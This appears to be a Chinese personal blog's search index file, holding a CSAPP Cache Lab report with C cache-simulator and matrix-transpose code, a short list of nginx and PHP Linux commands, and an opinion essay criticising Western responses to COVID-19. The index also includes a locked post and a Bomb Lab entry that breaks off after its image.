<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>计算机系统基础大作业</title>
    <url>/2020/06/02/1/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Hey, password is required here.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="ed198872861b1ad0b8f9e0e94a02c44f51d7cb234fbfc9b6717559e0a68ade25"></script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>CSAPP</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Cache Lab</title>
    <url>/2020/04/29/1/</url>
    <content><![CDATA[<p><img src="/2020/04/29/1/csapp.jpg" alt></p>
<a id="more"></a>

<h1 id="CSAPP-Cache-Lab解题报告"><a href="#CSAPP-Cache-Lab解题报告" class="headerlink" title="CSAPP Cache Lab解题报告"></a>CSAPP Cache Lab解题报告</h1><h3 id="任务A"><a href="#任务A" class="headerlink" title="任务A"></a>任务A</h3><p><strong>实现代码：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"cachelab.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;getopt.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ADDR_SIZE 64;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span>* filePath;</span><br><span class="line">    <span class="keyword">int</span> setNum;</span><br><span class="line">    <span class="keyword">int</span> lineNum;</span><br><span class="line">    <span class="keyword">int</span> blockNum;</span><br><span class="line">    <span class="keyword">bool</span> verbose;</span><br><span class="line">&#125;GlobalArgs;</span><br><span class="line">GlobalArgs globalArgs;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> tag;</span><br><span class="line">    <span class="keyword">int</span> timestamp;</span><br><span class="line">&#125;CacheLine;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span>* optString=<span class="string">"hvs:E:b:t:"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PrintHelp</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,<span class="string">"Usage: ./csim [-hv] -s &lt;num&gt; -E &lt;num&gt; -b &lt;num&gt; -t &lt;file&gt;"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,<span class="string">"Options:"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,<span class="string">"  -h         Print this help message"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,<span class="string">"  -v         Optional verbose flag"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,<span class="string">"  -s &lt;num&gt;   Number of set index bits."</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,<span class="string">"  -E &lt;num&gt;   Number of lines per set."</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,<span class="string">"  -b &lt;num&gt;   Number of block offset bits"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,<span class="string">"  -t &lt;file&gt;  Trace file."</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,<span class="string">"Examples:"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,<span class="string">"  linux&gt;  ./csim-ref -s 4 -E 1 -b 4 -t traces/yi.trace"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,<span class="string">"  linux&gt;  ./csim-ref -v -s 8 -E 2 -b 4 -t traces/yi.trace"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SetArgus</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> opt=getopt(argc,argv,optString);</span><br><span class="line">    <span class="keyword">while</span> (opt!=<span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">switch</span> (opt)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'h'</span>:</span><br><span class="line">                PrintHelp();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'v'</span>:</span><br><span class="line">                globalArgs.verbose=<span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'s'</span>:</span><br><span class="line">                globalArgs.setNum=atoi(optarg);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'E'</span>:</span><br><span class="line">                globalArgs.lineNum=atoi(optarg);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'b'</span>:</span><br><span class="line">                globalArgs.blockNum=atoi(optarg);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'t'</span>:</span><br><span class="line">                globalArgs.filePath=optarg;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"wrong argument\n"</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        opt=getopt(argc,argv,optString);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TryToHitCache</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> address,<span class="keyword">int</span>* hit,<span class="keyword">int</span>* miss,<span class="keyword">int</span>* eviction,CacheLine* cache)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> timestamp=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> tagLen=<span class="number">64</span>-(globalArgs.setNum+globalArgs.blockNum);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="built_in">set</span>=(<span class="keyword">unsigned</span> <span class="keyword">long</span>)((address&lt;&lt;tagLen)&gt;&gt;(tagLen+globalArgs.blockNum));</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> tag=(<span class="keyword">unsigned</span> <span class="keyword">long</span>)(address&gt;&gt;(<span class="number">64</span>-tagLen));</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">min</span>=globalArgs.lineNum*<span class="built_in">set</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;globalArgs.lineNum;i++)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> idx=<span class="built_in">set</span>*globalArgs.lineNum+i;</span><br><span class="line">        <span class="keyword">if</span>(cache[idx].tag==tag&amp;&amp;cache[idx].timestamp!=<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            cache[idx].timestamp=++timestamp;</span><br><span class="line">            (*hit)++;</span><br><span class="line">            <span class="keyword">if</span>(globalArgs.verbose)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"hit "</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(cache[idx].timestamp==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            cache[idx].timestamp=++timestamp;</span><br><span class="line">            (*miss)++;</span><br><span class="line">            cache[idx].tag=tag;</span><br><span class="line">            <span class="keyword">if</span>(globalArgs.verbose)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"miss "</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(cache[idx].timestamp&lt;cache[<span class="built_in">min</span>].timestamp)</span><br><span class="line">            <span class="built_in">min</span>=idx;</span><br><span class="line">    &#125;</span><br><span class="line">    cache[<span class="built_in">min</span>].timestamp=++timestamp;</span><br><span class="line">    cache[<span class="built_in">min</span>].tag=tag;</span><br><span class="line">    (*miss)++;</span><br><span class="line">    (*eviction)++;</span><br><span class="line">    <span class="keyword">if</span>(globalArgs.verbose)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"miss eviction "</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    SetArgus(argc,argv);</span><br><span class="line">    <span class="keyword">if</span>(globalArgs.filePath==<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    FILE* fp=fopen(globalArgs.filePath,<span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span>(fp==<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"File not found %s\n"</span>,globalArgs.filePath);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> hit=<span class="number">0</span>,miss=<span class="number">0</span>,eviction=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> S=(<span class="number">1</span>&lt;&lt;globalArgs.setNum);</span><br><span class="line">    <span class="keyword">int</span> E=globalArgs.lineNum;</span><br><span class="line"></span><br><span class="line">     CacheLine* cache=<span class="built_in">calloc</span>(S*E, <span class="keyword">sizeof</span>(CacheLine));</span><br><span class="line"></span><br><span class="line">     <span class="keyword">char</span> opt;</span><br><span class="line">     <span class="keyword">unsigned</span> <span class="keyword">long</span> address;</span><br><span class="line">     <span class="keyword">int</span> block;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">     <span class="keyword">while</span>(<span class="built_in">fscanf</span>(fp,<span class="string">" %c %lx,%d"</span>, &amp;opt,&amp;address,&amp;block)&gt;<span class="number">0</span>)</span><br><span class="line">     &#123;</span><br><span class="line">        <span class="keyword">if</span>(opt==<span class="string">'I'</span>)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">if</span>(globalArgs.verbose)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%c %lx,%d "</span>,opt,address,block);</span><br><span class="line">        &#125;</span><br><span class="line">        TryToHitCache(address,&amp;hit,&amp;miss,&amp;eviction,cache);</span><br><span class="line">        <span class="keyword">if</span>(opt==<span class="string">'M'</span>)</span><br><span class="line">            TryToHitCache(address,&amp;hit,&amp;miss,&amp;eviction,cache);</span><br><span class="line">        <span class="keyword">if</span>(globalArgs.verbose)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     fclose(fp);</span><br><span class="line">     <span class="built_in">free</span>(cache);</span><br><span class="line"></span><br><span class="line">     printSummary(hit,miss,eviction);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>实现思路：</strong></p>
<p>任务A就是打开文件读入数据、处理数据、输出数据的过程，核心逻辑就是在于怎么模拟一个高速缓存来处理数据。我们将这部分逻辑封装在了<code>void TryToHitCache(unsigned long address,int* hit,int* miss,int* eviction,CacheLine* cache)</code>这个函数中。</p>
<p>首先我们定义一个静态变量<code>static int timestamp</code>，这个变量用来记录CPU向高速缓存器访问的时间戳（用来记录访问次数）。在该函数里我们需要接受几个参数，分别为请求的地址，hit次数，miss次数，eviction次数以及模拟的高速缓存器。然后我们将address的各部分结构进行解析，分别得到了set、tag等参数。</p>
<p>然后我们遍历模拟高速缓存器的组，比较address解析的set数是否与模拟缓存器的set数相同和是否可能为冷未命中的情况下。</p>
<p>如果能找到相同的tag且不是冷未命中的话，就将hit++，且更改<code>timestamp</code>的值。如果是冷未命中的话，就将miss++，并且更新<code>timestamp</code>的值并且设置该块的值。</p>
<p>如果则两种情况都不是的话，则需要更换块的内容。那么我们需要更新哪个块呢？根据局部性原则，我们应当更新距离我们这次访问时间戳距离最远的块，因此我们遍历一遍该组并找出该块并进行更换。然后进行更新数据。</p>
<h3 id="任务B"><a href="#任务B" class="headerlink" title="任务B:"></a>任务B:</h3><p><strong>实现代码：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">transpose_submit</span><span class="params">(<span class="keyword">int</span> M, <span class="keyword">int</span> N, <span class="keyword">int</span> A[N][M], <span class="keyword">int</span> B[M][N])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a1,a2,a3,a4,a5,a6,a7,a8;</span><br><span class="line">    <span class="keyword">int</span> i,j,k,h;</span><br><span class="line">    <span class="keyword">if</span>(N==<span class="number">32</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">4</span>;j++)&#123;</span><br><span class="line">                <span class="keyword">for</span>(k=i*<span class="number">8</span>;k&lt;(i+<span class="number">1</span>)*<span class="number">8</span>;k++)&#123;</span><br><span class="line">                    h=j*<span class="number">8</span>;</span><br><span class="line">                    a1=A[k][h];a2=A[k][h+<span class="number">1</span>];a3=A[k][h+<span class="number">2</span>];a4=A[k][h+<span class="number">3</span>];</span><br><span class="line">                    a5=A[k][h+<span class="number">4</span>];a6=A[k][h+<span class="number">5</span>];a7=A[k][h+<span class="number">6</span>];a8=A[k][h+<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">                    B[h][k]=a1;B[h+<span class="number">1</span>][k]=a2;B[h+<span class="number">2</span>][k]=a3;B[h+<span class="number">3</span>][k]=a4;</span><br><span class="line">                    B[h+<span class="number">4</span>][k]=a5;B[h+<span class="number">5</span>][k]=a6;B[h+<span class="number">6</span>][k]=a7;B[h+<span class="number">7</span>][k]=a8;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(N==<span class="number">64</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">64</span>;i+=<span class="number">8</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">64</span>;j+=<span class="number">8</span>)&#123;</span><br><span class="line">                <span class="keyword">for</span>(k=j;k&lt;j+<span class="number">4</span>;++k)&#123;</span><br><span class="line">                    a1=A[k][i];a2=A[k][i+<span class="number">1</span>];a3=A[k][i+<span class="number">2</span>];a4=A[k][i+<span class="number">3</span>];</span><br><span class="line">                    a5=A[k][i+<span class="number">4</span>];a6=A[k][i+<span class="number">5</span>];a7=A[k][i+<span class="number">6</span>];a8=A[k][i+<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">                    B[i][k]=a1;B[i][k+<span class="number">4</span>]=a5;B[i+<span class="number">1</span>][k]=a2;B[i+<span class="number">1</span>][k+<span class="number">4</span>]=a6;</span><br><span class="line">                    B[i+<span class="number">2</span>][k]=a3;B[i+<span class="number">2</span>][k+<span class="number">4</span>]=a7;B[i+<span class="number">3</span>][k]=a4;B[i+<span class="number">3</span>][k+<span class="number">4</span>]=a8;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">for</span>(k=i;k&lt;i+<span class="number">4</span>;++k)&#123;</span><br><span class="line">                    a1=B[k][j+<span class="number">4</span>];a2=B[k][j+<span class="number">5</span>];a3=B[k][j+<span class="number">6</span>];a4=B[k][j+<span class="number">7</span>];</span><br><span class="line">                    a5=A[j+<span class="number">4</span>][k];a6=A[j+<span class="number">5</span>][k];a7=A[j+<span class="number">6</span>][k];a8=A[j+<span class="number">7</span>][k];</span><br><span class="line"></span><br><span class="line">                    B[k][j+<span class="number">4</span>]=a5;B[k][j+<span class="number">5</span>]=a6;B[k][j+<span class="number">6</span>]=a7;B[k][j+<span class="number">7</span>]=a8;</span><br><span class="line">                    B[k+<span class="number">4</span>][j]=a1;B[k+<span class="number">4</span>][j+<span class="number">1</span>]=a2;B[k+<span class="number">4</span>][j+<span class="number">2</span>]=a3;B[k+<span class="number">4</span>][j+<span class="number">3</span>]=a4;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">for</span>(k=i+<span class="number">4</span>;k&lt;i+<span class="number">8</span>;++k)&#123;</span><br><span class="line">                    a1=A[j+<span class="number">4</span>][k];a2=A[j+<span class="number">5</span>][k];a3=A[j+<span class="number">6</span>][k];a4=A[j+<span class="number">7</span>][k];</span><br><span class="line"></span><br><span class="line">                    B[k][j+<span class="number">4</span>]=a1;B[k][j+<span class="number">5</span>]=a2;B[k][j+<span class="number">6</span>]=a3;B[k][j+<span class="number">7</span>]=a4;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i+=<span class="number">16</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;M;j+=<span class="number">16</span>)&#123;</span><br><span class="line">                <span class="keyword">for</span>(k=i;k&lt;i+<span class="number">16</span>&amp;&amp;k&lt;N;k++)&#123;</span><br><span class="line">                    <span class="keyword">for</span>(h=j;h&lt;j+<span class="number">16</span>&amp;&amp;h&lt;M;h++)&#123;</span><br><span class="line">                        B[h][k]=A[k][h];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>实现思路：</strong></p>
<p>本题很明显要使用分块进行优化，但分块后如下后距离答案要求的数量还有不少距离。</p>
<p>我这里参考了网上大神们的做法。</p>
<p><strong>32×32：</strong></p>
<p>第一题要求miss次数在300以下，首先观察，Cache的一个块只有32B，也就是只能容纳8个int。这个Cache可以容纳这个matrix的前8行。分块的话，肯定是取8×8的比较合适。先读取A的一行，然后放入B的一列。12个int变量，4个用来循环，其余8个用来存A中块的一行。</p>
<p>对于在对角线上的块，A中每读一行，会有一次miss，也就是miss次数是读取操作的1/8，对于B数组的话，第一次读取这行会产生一次miss，之后对于第i行，只有A中读到第i行的时候，会被移除出Cache，然后存的时候会产生一次miss。可以粗略计算为miss次数是读取次数的1/4。</p>
<p>对于不在对角线上的块，做转置的时候，A还是1/8的miss率，B的每行在Cache中和A的行不冲突 ，所以也是1/8的miss率，我们计算下最后大概多少次miss呢？</p>
<p>大概是 <img src="https://www.zhihu.com/equation?tex=4%5Ctimes+64%5Ctimes%28%5Cfrac%7B1%7D%7B8%7D%2B%5Cfrac%7B1%7D%7B4%7D%29%2B12%5Ctimes+64%5Ctimes2%5Ctimes%5Cfrac%7B1%7D%7B8%7D%3D288" alt="[公式]"></p>
<p>最后跑出来的答案是287，非常接近。</p>
<p><strong>64×64：</strong></p>
<p>首先考虑Cache中只能放4行A中的行，如果再用8×8的块，前面4行可以填入，后面4行会在Cache中发生冲突，导致miss次数增加。</p>
<p>如果只用4×4的块呢？那么每次Cache中放入8个int，我们却只用4个，浪费严重，我用这个方法最少也只能做到1677次miss。</p>
<p>有一种很巧妙的方法，就是还用8×8的块来做，题目说A数组不能变换，但是说B数组可以任意操作啊。我们必须要一步到位嘛？可否考虑先把数字移动到B中，然后在B中自己做变化。</p>
<p>考虑用同样的miss次数，把更多的数据移动到B中，但是不一定是正确的位置，然后再用同样的miss次数，把A中部分数据移动到B中时，完成把B中前面位置错误数据的纠正。</p>
<p>1.先考虑把A的上半部分存入到B，但是为了考虑Cache不冲突，所以把右上角的4×4的区域也存在B的右上角。对于在对角线上的块，A的miss率是1/8，B的左上角部分miss率是1/2。对于不在对角线上的块，A的miss率还是1/8，B左上角部分的miss率为1/4.</p>
<p>\2. 接下来这步是减少miss率的关键，把A左下角的一列4个数据读出，B右上角的一行4个数据读出，都用int变量暂存，然后把前四个填入B右上角行中，后四个填入B的左下角行中。</p>
<p>因为从B右上角读取的时候，把块放入了Cache，然后从A往B中填的时候，就不会出现miss操作。</p>
<p>来计算一下miss率，对于在对角线上的块，从A左下角读取miss率为1，B的右上角的操作miss率为1/4，B的左下角miss率为1/4。对于不在对角线的快，A的miss率为1/4，B右上角miss率为0，左下角miss率为1/4。</p>
<p>\3. 最后一步就是把A的右下角填入B的右下角，对于在对角线上的块，A的miss率为1/4，B的miss率为1/2.不在对角线上的块，A，B的miss率都为0.</p>
<p>最后我们来计算下miss的次数吧，计算出来近似是1280次，实际我们代码跑出来是1219次 。</p>
<p><strong>61×67：</strong></p>
<p>不规则的matrix，本质也是用分块来优化Cache的读写，但是不能找到比较显然的规律看出来间隔多少可以填满一个Cache，但是由于要求比较松，我们可以尝试一些分块的大小，直接进行转置操作。尝试到16左右 ，可以小于2000次miss。</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>CSAPP</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux命令总结（持续更新中）</title>
    <url>/2020/04/12/1/</url>
    <content><![CDATA[<a id="more"></a>

<h1 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx:"></a>Nginx:</h1><ul>
<li>查看端口：netstat -ntpl;</li>
<li>结束监听：kill (number)</li>
<li>启动nginx服务：sudo service nginx start</li>
<li>停止nginx服务：sudo service nginx stop</li>
<li>重启nginx服务：service nginx restart；systemctl restart nginx</li>
<li>nginx访问日志的默认路径:/var/log/nginx</li>
<li>nginx配置文件：/etc/nginx/nginx.conf</li>
<li>nginx服务器默认目录:/usr/share/nginx/html</li>
<li>nginx -t 测试配置文件语法，同时告诉配置文件位置</li>
</ul>
<h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><ul>
<li>查看php所有软件包：rpm -qa|grep php</li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>服务器</tag>
      </tags>
  </entry>
  <entry>
    <title>西方没有资本再傲慢了</title>
    <url>/2020/04/06/1/</url>
    <content><![CDATA[<h1 id="一种病毒，两种制度？"><a href="#一种病毒，两种制度？" class="headerlink" title="一种病毒，两种制度？"></a>一种病毒，两种制度？</h1><blockquote>
<p>中国人若想消灭这次新型冠状病毒，需要的药房既不是西药疫苗，也不是中草药，而是自由和民主</p>
<p>——德国 《明镜》</p>
</blockquote>
<blockquote>
<p>在应对新冠病毒的处理方式上，民主制度显示了无可辩驳的优越性</p>
<p>——法国 《费加罗报》</p>
</blockquote>
<blockquote>
<p>传染疾病在民主国家的致死率，总是低于像中国这样的专制国家</p>
<p>专制国家缺少信息的自由流动和与民众的对话，会导致决策的失误</p>
<p>——英国 《经济学人》</p>
</blockquote>
<a id="more"></a>

<p><a href="https://www.economist.com/graphic-detail/2020/02/18/diseases-like-covid-19-are-deadlier-in-non-democracies" target="_blank" rel="noopener">Diseases like covid-19 are deadlier in non-democracies(经济学人)</a></p>
<p>西方的民主优越理念，是西方对于中国抨击的主要理由，在这次疫情的爆发中，西方以中国为专制国家为理由对于中国爆发的疫情进行抨击、嘲笑、歧视，他们认为，是因为像中国这样一个“专制国家”，缺乏与民众的沟通，并且由于对于群众言论的审查、封杀而导致了新型冠状病毒的发生，他们对此不屑一顾，并且认为以中国如此“落后”的医疗条件都能使疫情逐渐好转，那在我们资本主义的“发达”国家中根本不成问题。</p>
<p>而事实上，西方资本主义国家在那里不停地摆数据、讲道理，极尽一切手段用来说明西方民主制度要比中国更为高明。在他们所得出的结论里，美国、加拿大、德国、法国这些西方资本主义国家是应对病毒最为可靠的国家，而像中国，却仅仅排在第51个位置。可是像美国这样一个应对H1N1如此失败的国家，它是有如何的脸面忝居首列呢？他们对于数据的恶意的挑选从而来进行一些完全没有科学依据的说明，西方的人文社科报告，尤其是此类关乎政治的报告，总是刻意地去美化西方而贬低社会主义国家。经过此次疫情我们完全可以看出，西方各种“权威组织”所进行的研究调查完全是不可靠的，只会沦为政治的附庸。</p>
<p>西方的资本在疫情面前潜逃了，而他们发达的媒体系统只顾着一味地欺骗群众和对于中国无尽的诋毁，他们的政府有的进行党争，而有的则在进行十年才能讨论出结果的议会。</p>
<blockquote>
<p>挪威虽然不能像中国那样在10天内建成有1000个床位的医院，而且在7年内才定下来一个仅有100个座位的会议厅，但他们会比中国做得更好，因为专制国家缺少信息的自由流动和与民众的对话，会导致决策的失误</p>
<p>——英国 《经济学人》</p>
</blockquote>
<p>而事实上，正是由于西方对于疫情的傲慢与忽视，导致新冠病毒在欧洲大肆横行，也正是由于西方所崇尚的自由与个人权力至上论，导致欧洲的病毒一发不可收拾，他们依然不带口罩，他们依然举行球赛，他们依然举办聚会，国家禁止举办1000人以上的聚会，他们就举办999人的，他们管这个叫做自由。但如此之“自由”只能导致害人害己。</p>
<p>事实上，正是由于西方所崇尚的民主优越论与自由至上论与他们所推崇的分权与多党执政导致他们的政府惯于使用欺骗、甩锅来进行党争，他们并没有对任何人民负起责任，他们只为了自己和他们的政党来谋取利益，他们只关注于支持他们的人，他们所崇尚的自由就是每一个人都不需要为另外一个人和整个集体负任何责任，与其说他们在“分权”，不如说他们在“分责”，他们只在乎国家资本的运作而不关心民众的死活。当记者向特朗普质疑“为什么富人可以得到这么多的物资而穷人却得不到”，他回答，“<strong>世界本来就是这样</strong>”。</p>
<p>在从前，他们靠着殖民和迫害穷人来发家致富；现在，他们又大行其道地谈论着民主。他们所谓的“自由”与“民主”让他们变得异常傲慢，他们听不见世界的声音，听不见民众的呼唤，这是一种被裹挟着的民主。</p>
<p>在推特上，许许多多质疑西方资本的声音被审查、封闭乃至封杀，这更像一个专制国家而非民主国家所进行的行为，他们歧视华裔，骂黄种人是“东亚病夫”，这更像是“民粹”而非“平等”的行为。</p>
<p><strong>西方已再一次到了至暗时刻，可是现在已经没有了丘吉尔</strong></p>
<h1 id="纳粹主义滋长"><a href="#纳粹主义滋长" class="headerlink" title="纳粹主义滋长"></a>纳粹主义滋长</h1><p>事实上，在这一次疫情中，我也看到了纳粹主义滋生的苗头。事实上，不仅在西方，在中国内也有这种倾向的出现。纳粹主义又叫做“国家民族社会主义”，纳粹主义一般有以下几种表现：</p>
<blockquote>
<ol>
<li>极端的民族主义，以血统等标准划分民族，并以民族为单位叙事，尤其是<strong>以民族划分敌我关系</strong></li>
<li><strong>宣扬仇恨。</strong>鼓吹对特定国家或族群的复仇，尤其是无底线的报复。</li>
<li>排外，要求建立纯粹民族或单一民族至上的国家。</li>
<li>鼓吹武力扩张，从根本上否认和平共存可能性。</li>
<li>极权思想，要求每个个体完全彻底为民族和国家利益服务，否定个人的选择自由。</li>
</ol>
</blockquote>
<p>在西方，许多民众将这一切归罪于中国，并将其认为是黄种人的过错，他们主张以暴力手段对于中国展开报复，他们对于华裔具有极大的恶意并且使用暴力手段对于华裔进行血腥报复，在他们国家恶意的引导下，我很怀疑这种纳粹主义倾向会不会卷土重来，而在当时的德国，希特勒就是利用一战后德国人对于犹太人的不满进而煽动反种族情绪，这是十分令人值得担心的。因为我们无法断定是否有疯狂的政府利用民众对于疫情的愤怒使用战争来进行祸水东流。</p>
<p>而在国内的网络社区中，我也经常看到经常有人对于西方乃至整个种族进行了极端恶意的排斥，我们可以对于某些人、某些政治人物进行排斥，但不能对于整个国家人民乃至整个种族进行污名化处理。</p>
<p><strong>这是我们应当做的。</strong></p>
]]></content>
      <categories>
        <category>杂文</category>
      </categories>
      <tags>
        <tag>杂论</tag>
        <tag>爱国</tag>
      </tags>
  </entry>
  <entry>
    <title>Bomb Lab实验报告</title>
    <url>/2020/04/05/1/</url>
    <content><![CDATA[<p><img src="/2020/04/05/1/csapp.jpg" alt></p>
<a id="more"></a>

